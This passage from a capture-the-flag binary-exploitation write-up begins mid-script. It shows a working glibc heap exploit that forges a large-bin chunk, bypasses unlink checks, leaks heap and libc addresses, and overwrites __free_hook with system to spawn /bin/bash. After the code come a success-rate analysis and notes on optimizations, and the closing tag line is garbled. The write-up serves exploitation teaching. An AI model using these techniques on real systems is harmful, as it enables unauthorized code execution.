    write_heapaddr_at(r,0x13370470)#serves as fd
    write_heapaddr_at(r,0x13370468)#fd, same val as fd
    '''size , notice that it misaligned
    #this is because we cannot have a size that is larger than the mmaped
    #space , or we will sigsev, so i write 2bytes , it is guaranteed here
    #that the topmost nibble is 0'''
    write_heapaddr_at(r,0x1337045c)


#setting up prev size in several possible places where it might land
#depending on size
#, of course there is a hign chance that
#the size is misaligned and thus advancing by 8 isn't gonna
#work , this is one of the limitation of this exploitation
#approach , realiance on probablity

# this is done to circumvent :
    '''
     #define unlink(AV, P, BK, FD) {
    if (__builtin_expect (chunksize(P) != next_chunk(P)->prev_size, 0))
        malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);
    '''
    targ =  0x13371000-16-4
    while targ > 0x13370480 :
        if targ not in range(0x133707f0,0x13370920):
            write_heapaddr_at(r,targ)
        targ -= 16




    #large-bin to mem

    #here we fake the links in the head AND the linka in the chunk that
    #plays bk and and fd in out fake chunk so we can pass the unlink tests:
    '''
#define unlink(AV, P, BK, FD) {                                            \
        ...
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             \
    malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
...
    '''

    fake_links = 4*p64(0x13370458)
    links_payload = fake_links+\
            (0x800-16-len(fake_links))*b'A'\
            +p64(0x0)+p64(0x411) +fake_links

    resp = update(r,2,len(links_payload),links_payload)

    try :
        #now the head will not satisfy this so we'll go to bk_nextsize
        #which will be our fake chunk because we faked the links
        # we play another chance here is that the size we have writted
        #(with the misaligned write of the heap address) is large enough
        # specifically larger than 0x400
        forged_chunk = allocate(r,0x400-0x8)#10
        payload  = 0x398*b'Y' + 3*p64(0) + p64(0x13377331)\
            +p64(0x13370830)+p64(0x80)
        resp = update(r,forged_chunk,len(payload),payload)
        def write_what_where(r,target,value):
            fake_buff = p64(target)+p64(len(value)+12)
            resp = update(r,0,len(fake_buff),fake_buff)
            resp = update(r,1,len(value),value)

        def read_size_where(r,target,size):
            fake_buff = p64(target)+p64(size)
            resp = update(r,0,len(fake_buff),fake_buff)
            resp = view(r,1)
            return resp[0:size]

        write_what_where(r,0x133708b0,2*p64(0))
        write_what_where(r,0x133708c0,2*p64(0))
        write_what_where(r,0x133708d0,2*p64(0))
        write_what_where(r,0x13370840,2*p64(0xf))
        write_what_where(r,0x13370878,(0xb0-0x78-12)*b'A')


        #heap leak
        allocate(r,0xb00)#backwards guard
        tmp2 = allocate(r,0xe00)
        allocate(r,0xd00)#forwards guard
        heapleak = u64(read_size_where(r,0x133708c0,8))
        print(f"\nheap leak : {hex(heapleak)}")

        #put in the unsorted bin
        delete(r,tmp2)

        #libc leak
        libcleak = u64(read_size_where(r,heapleak+8,8))
        libcelf.address = libcleak - 3775320
        print(f"\nlibc base : {hex(libcelf.address)}")

        #shell
        free_hook = libcelf.symbols['__free_hook']
        system_addr = libcelf.symbols['system']

        write_what_where(r,free_hook,p64(system_addr))

        command_chunk = allocate(r,0xe00)
        command = b"/bin/bash;"
        resp = update(r,command_chunk,len(command),command)
        delete_getshell(r,command_chunk)
        exit()

    except Exception as e:
        attempt += 1
        print(f"\rfailed attempts : {attempt}", end="", flush=True)
        r.close()
        continue

exit()
```

## Probablistic and statistical Analysis of the success rate
### Probabilistic analysis
- the probabilistic nature of this approach is caused by the following constraints on the forged size we write to the forged chunk and then spray throughout possible next `prev_size` locations :
	- it should be constrained within the a range of 0x400 to 0xba0 , see the relevant section for exact reasons. this puts our chance at (0xba0-0x400)/0xfff
	- it should be aligned to 8 , this and an additional 1/8
	- chunk+fake size should coincide with a valid sprayed  size and not "polluted bytes" (refer to the relevant section for details) , since half the sprayed memory is valid size , this is a 1/2 chance 
- assuming address randomization yields uniformly distributed values , as is is the source of the size an thus all its properties , the events are not independent , since they all depend on randomization , but for simplicity we will treat them as independent , in that case we can multiply the individual probabilities to deduce the overall success rate:
$P(success) = ((0xba0-0x400)/0xfff)*(1/8)*(1/2) = 0.029792 ≈ 3\%$  

### Statistical analysis 
- I have done this by modifying the exploit to count the overall attempt count and success count and display them along with the average of the success count over the attempt count . 
- the result was $2.1\%$ success rate , significantly less than the calculated success rate , this can be attributed to the simplifying (but strictly false) independence assumption made in the probabilistic analysis:
```output
total attempts : 3346        
success : 71        
average success : 0.021219366407650927        
ideal success : 71        
average ideal success : 0.021219366407650927
```
- `success` refers to the count of  complete successful attemps where a shell was obtained.
- `ideal success` refers to the count of attempts in which a forged chunk was returned from `_int_malloc` , since the exploit is supposed to be deterministic after that point ,  i tested to see if some factor was inhibiting the exploit of getting leaks/shell when a forged chunk was successfully returned , as can be observed the `ideal success` and `success` counts are equal indicating that once a forged chunk is returned the success rate is $100\%$. 

## Possible and attempted optimizations
- I list here two improvements , one to increase the overall success rate and the other to increase the overall speed of the exploit
### Optimizing the forged size frequency
- we can leverage the fact that the higher 2 bytes of heap addresses are always zero (OS specific) and use our write-heap-address-where primitive to write the address at decreasing offsets of a "corrupted " field to clear , more specifically write to the target then target -2 then target-4 , the first two writes will clear the higher 4 bytes and the third will clear two bytes further and write the two-bytes size in the lower bytes , since "pollution" happens to the previous 8 bytes field when we write a forged size somewhere, this process will need to be performed from the end of target region the start to clear the "pollution" backwards.
- i tested this and it is possible with minimal modification of the exploit code , yet since this both doubles (we write to each  8 bytes field instead of jumping 16) then triples (3 writes per field) the operations in the center of a loop , it's performance penalty was not worth the doubling of the success rate by eliminating a 1/2 chance of valid size / pollution , and so i did not include it.
### Utilizing the second write from the large bin variant
- this is the most meaningful performance optimization , by utilizing the second write , we can halve the number of iterations in the size spraying loop , since the loop makes up most of the exploit work , this should yield a noticeable performance improvement , I did not use it for the sake of simplicity.

#write-up #pwn #infosec #cs 
#awrite0-up #binapwn#pwn #info#infosec #cs#cs 